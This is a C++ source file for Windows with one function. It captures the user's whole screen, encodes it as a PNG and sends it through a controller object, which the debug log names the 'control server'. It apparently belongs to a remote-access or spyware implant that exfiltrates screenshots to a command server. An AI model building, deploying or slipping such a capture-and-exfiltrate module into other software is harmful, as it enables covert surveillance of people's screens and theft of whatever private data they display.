#include <vector>
#include <lodepng.h>
#include <Windows.h>
#include <cstdint>
#include "controller.h"
#include "log.h"
using namespace std;

int screenshot(Controller& ctrl) {
	DEBUGLOG("starting screenshot\n");
	HDC screenDC = GetDC(nullptr);
	HDC bitmapDC = CreateCompatibleDC(screenDC);
	int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
	int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
	int x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	int y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	int width = x2 - x;
	int height = y2 - y;
	DEBUGLOG("creating bitmap...\n");
	HBITMAP hBmp = CreateCompatibleBitmap(screenDC, width, height);
	DEBUGLOG("selecting object...\n");
	SelectObject(bitmapDC, hBmp);
	DEBUGLOG("performing bitblt...\n");
	BitBlt(bitmapDC, 0, 0, width, height, screenDC, x, y, SRCCOPY);

	BITMAPINFOHEADER bi = {};
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = width;
	bi.biHeight = -height;
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;

	GetDIBits(screenDC, hBmp, 0, height, nullptr, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
	unsigned char* pixels = new unsigned char[bi.biSizeImage];
	DEBUGLOG("getting DIBits...\n");
	GetDIBits(screenDC, hBmp, 0, height, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
	DEBUGLOG("deleting objects...\n");
	DeleteObject(hBmp);
	DeleteObject(bitmapDC);
	ReleaseDC(nullptr, screenDC);

	DEBUGLOG("reformatting byte data...\n");
	int bpp = bi.biBitCount / 8;
	int numPixels = width * height;
	for (int i = 0; i < numPixels; i += 1) {
		int tmp = pixels[4*i];
		pixels[4*i] = pixels[bpp*i + 2];
		pixels[4*i + 2] = tmp;
	}

	DEBUGLOG("encoding as PNG...\n");
	unsigned char* png = nullptr;
	size_t pngSize;
	lodepng_encode32(&png, &pngSize, pixels, width, height);
	DEBUGLOG("copying to buffer...\n");
	vector<uint8_t> buf(png, png + pngSize);
	DEBUGLOG("freeing PNG object...\n");
	free(png);
	DEBUGLOG("sending to control server...\n");
	ctrl.send_buffer(buf);
	DEBUGLOG("done\n");

	return 0;
}